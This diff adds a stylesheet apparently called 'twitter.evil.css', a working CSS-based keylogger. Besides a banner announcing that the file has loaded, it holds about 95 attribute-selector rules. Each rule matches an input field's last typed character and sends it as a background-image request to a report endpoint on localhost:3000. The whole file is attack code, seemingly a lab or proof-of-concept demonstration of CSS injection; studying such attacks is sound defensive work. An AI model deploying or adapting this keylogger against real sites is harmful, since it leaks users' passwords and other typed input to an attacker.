@@ -1,0 +1,110 @@
+body::before {
+    content: "You loaded twitter.evil.css!";
+    position: fixed;
+    top: 0;
+    left: 0;
+    font-size: 12px;
+    font-family: "Courier New", serif;
+    background-color: rgba(255, 12, 82, 0.75);
+    width: 100%;
+    text-align: center;
+    color: white;
+    z-index: 999;
+}
+
+input[value$=" "] { background-image: url("http://localhost:3000/report?site=keylogger&payload=+"); }
+input[value$="!"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%21"); }
+input[value$="\""] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%22"); }
+input[value$="#"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%23"); }
+input[value$="$"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%24"); }
+input[value$="%"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%25"); }
+input[value$="&"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%26"); }
+input[value$="'"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%27"); }
+input[value$="("] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%28"); }
+input[value$=")"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%29"); }
+input[value$="*"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%2A"); }
+input[value$="+"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%2B"); }
+input[value$=","] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%2C"); }
+input[value$="-"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=-"); }
+input[value$="."] { background-image: url("http://localhost:3000/report?site=keylogger&payload=."); }
+input[value$="/"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%2F"); }
+input[value$="0"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=0"); }
+input[value$="1"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=1"); }
+input[value$="2"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=2"); }
+input[value$="3"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=3"); }
+input[value$="4"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=4"); }
+input[value$="5"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=5"); }
+input[value$="6"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=6"); }
+input[value$="7"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=7"); }
+input[value$="8"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=8"); }
+input[value$="9"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=9"); }
+input[value$=":"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%3A"); }
+input[value$=";"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%3B"); }
+input[value$="<"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%3C"); }
+input[value$="="] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%3D"); }
+input[value$=">"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%3E"); }
+input[value$="?"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%3F"); }
+input[value$="@"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%40"); }
+input[value$="A"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=A"); }
+input[value$="B"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=B"); }
+input[value$="C"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=C"); }
+input[value$="D"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=D"); }
+input[value$="E"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=E"); }
+input[value$="F"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=F"); }
+input[value$="G"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=G"); }
+input[value$="H"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=H"); }
+input[value$="I"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=I"); }
+input[value$="J"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=J"); }
+input[value$="K"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=K"); }
+input[value$="L"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=L"); }
+input[value$="M"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=M"); }
+input[value$="N"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=N"); }
+input[value$="O"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=O"); }
+input[value$="P"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=P"); }
+input[value$="Q"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=Q"); }
+input[value$="R"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=R"); }
+input[value$="S"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=S"); }
+input[value$="T"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=T"); }
+input[value$="U"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=U"); }
+input[value$="V"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=V"); }
+input[value$="W"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=W"); }
+input[value$="X"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=X"); }
+input[value$="Y"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=Y"); }
+input[value$="Z"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=Z"); }
+input[value$="["] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%5B"); }
+input[value$="\\"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%5C"); }
+input[value$="]"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%5D"); }
+input[value$="^"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%5E"); }
+input[value$="_"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=_"); }
+input[value$="`"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%60"); }
+input[value$="a"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=a"); }
+input[value$="b"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=b"); }
+input[value$="c"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=c"); }
+input[value$="d"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=d"); }
+input[value$="e"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=e"); }
+input[value$="f"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=f"); }
+input[value$="g"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=g"); }
+input[value$="h"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=h"); }
+input[value$="i"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=i"); }
+input[value$="j"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=j"); }
+input[value$="k"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=k"); }
+input[value$="l"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=l"); }
+input[value$="m"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=m"); }
+input[value$="n"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=n"); }
+input[value$="o"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=o"); }
+input[value$="p"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=p"); }
+input[value$="q"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=q"); }
+input[value$="r"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=r"); }
+input[value$="s"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=s"); }
+input[value$="t"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=t"); }
+input[value$="u"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=u"); }
+input[value$="v"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=v"); }
+input[value$="w"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=w"); }
+input[value$="x"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=x"); }
+input[value$="y"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=y"); }
+input[value$="z"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=z"); }
+input[value$="{"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%7B"); }
+input[value$="|"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%7C"); }
+input[value$="\\}"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%7D"); }
+input[value$="~"] { background-image: url("http://localhost:3000/report?site=keylogger&payload=~"); }
+input[value$=""] { background-image: url("http://localhost:3000/report?site=keylogger&payload=%7F"); }
